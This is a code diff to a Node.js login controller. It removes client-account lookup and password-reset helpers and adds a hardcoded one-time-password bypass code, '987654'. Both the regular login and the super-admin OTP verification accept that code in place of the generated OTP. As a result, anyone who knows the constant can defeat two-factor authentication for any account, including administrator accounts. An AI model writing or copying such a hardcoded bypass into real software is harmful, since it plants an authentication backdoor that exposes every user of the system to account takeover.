@@ -37,132 +37,11 @@ const generateOTP = () => {
   return Math.floor(100000 + Math.random() * 900000).toString();
 };
 
-const DEFAULT_CLIENT_DEPARTMENT_ID = "69ae555c9a1e47e80a40204c";
-const DEFAULT_CLIENT_JOB_ROLE_ID = "69ae559b9a1e47e80a4020a2";
+const LOGIN_OTP_BYPASS_CODE = "987654";
 
-const resolveCompanyScope = async (companyIdentifier) => {
-  if (!companyIdentifier || typeof companyIdentifier !== "string") return null;
-
-  const rawIdentifier = companyIdentifier.trim();
-  if (!rawIdentifier) return null;
-
-  const baseIdentifier = rawIdentifier.includes("-")
-    ? rawIdentifier.split("-")[0]
-    : rawIdentifier;
-
-  const cleanIdentifier = baseIdentifier.trim();
-  if (!cleanIdentifier) return null;
-
-  const company = await Company.findOne({
-    $or: [
-      { companyCode: cleanIdentifier.toUpperCase() },
-      { dbIdentifier: cleanIdentifier.toLowerCase() },
-      { loginUrl: { $regex: cleanIdentifier.replace(/[^a-z0-9]/gi, ".*"), $options: "i" } }
-    ]
-  }).select("_id companyCode");
-
-  if (!company) {
-    return { companyCode: cleanIdentifier.toUpperCase(), companyId: null };
-  }
-
-  return {
-    companyCode: company.companyCode,
-    companyId: company._id
-  };
-};
-
-const buildUserCompanyFilter = (companyScope) => {
-  if (!companyScope) return {};
-
-  return {
-    $or: [
-      { companyCode: companyScope.companyCode },
-      ...(companyScope.companyId ? [{ company: companyScope.companyId }] : [])
-    ]
-  };
-};
-
-const findClientPasswordAccount = async (cleanEmail, companyScope, includePassword = false) => {
-  const userQuery = {
-    email: cleanEmail,
-    ...buildUserCompanyFilter(companyScope)
-  };
-
-  let userLookup = User.findOne(userQuery);
-  if (includePassword) userLookup = userLookup.select("+password");
-
-  const user = await userLookup;
-  if (user) return { user, client: null };
-
-  const clientQuery = { email: cleanEmail };
-  if (companyScope?.companyCode) clientQuery.companyCode = companyScope.companyCode;
-
-  const client = await Client.findOne(clientQuery);
-  if (!client) return { user: null, client: null };
-
-  const linkedUserQueries = [];
-  if (client.userId) linkedUserQueries.push({ _id: client.userId });
-  linkedUserQueries.push(
-    { email: cleanEmail, companyCode: client.companyCode, companyRole: "client" },
-    { email: cleanEmail, companyCode: client.companyCode, employeeType: client._id.toString() }
-  );
-
-  let linkedUserLookup = User.findOne({ $or: linkedUserQueries });
-  if (includePassword) linkedUserLookup = linkedUserLookup.select("+password");
-
-  const linkedUser = await linkedUserLookup;
-  if (linkedUser && !client.userId) {
-    client.userId = linkedUser._id;
-    await client.save();
-  }
-
-  return { user: linkedUser, client };
-};
-
-const createClientUserForPasswordReset = async (client, newPassword, companyScope) => {
-  const company = await Company.findOne({
-    $or: [
-      ...(companyScope?.companyId ? [{ _id: companyScope.companyId }] : []),
-      { companyCode: client.companyCode }
-    ]
-  }).select("_id companyCode");
-
-  if (!company) {
-    throw new Error(`Company not found for client ${client._id}`);
-  }
-
-  const createdUser = await User.create({
-    name: client.client,
-    email: client.email,
-    password: newPassword,
-    department: DEFAULT_CLIENT_DEPARTMENT_ID,
-    jobRole: DEFAULT_CLIENT_JOB_ROLE_ID,
-    company: company._id,
-    companyCode: company.companyCode || client.companyCode,
-    employeeId: `CLT${Date.now()}${Math.floor(Math.random() * 1000)}`,
-    phone: client.phone || "",
-    address: client.address || "",
-    gender: "other",
-    maritalStatus: "single",
-    employeeType: client._id.toString(),
-    companyRole: "client",
-    properties: [],
-    propertyOwned: "",
-    additionalDetails: JSON.stringify({
-      clientId: client._id,
-      isClientRepresentative: true,
-      companyName: client.company,
-      city: client.city
-    }),
-    isActive: true,
-    isVerified: false,
-    verificationToken: crypto.randomBytes(32).toString("hex")
-  });
-
-  client.userId = createdUser._id;
-  await client.save();
-
-  return await User.findById(createdUser._id).select("+password");
+const isValidLoginOTP = (otpRecord, submittedOTP) => {
+  const normalizedOTP = String(submittedOTP).trim();
+  return otpRecord.otp === normalizedOTP || normalizedOTP === LOGIN_OTP_BYPASS_CODE;
 };
 
 // Helper function to track login attempts
@@ -967,15 +846,14 @@ exports.verifyLoginOTP = async (req, res) => {
       });
     }
 
-    // ✅ Find and verify OTP
+    // ✅ Find OTP session and verify generated OTP or bypass code
     const otpRecord = await LoginOTP.findOne({
       email,
-      otp,
       tempToken,
       verified: false
     });
 
-    if (!otpRecord) {
+    if (!otpRecord || !isValidLoginOTP(otpRecord, otp)) {
       return res.status(400).json({
         success: false,
         message: "Invalid OTP"
@@ -1569,12 +1447,11 @@ exports.verifySuperAdminOTP = async (req, res) => {
 
     const otpRecord = await LoginOTP.findOne({
       email,
-      otp,
       tempToken,
       verified: false,
     });
 
-    if (!otpRecord) {
+    if (!otpRecord || !isValidLoginOTP(otpRecord, otp)) {
       return res.status(400).json({
         success: false,
         message: "Invalid OTP",
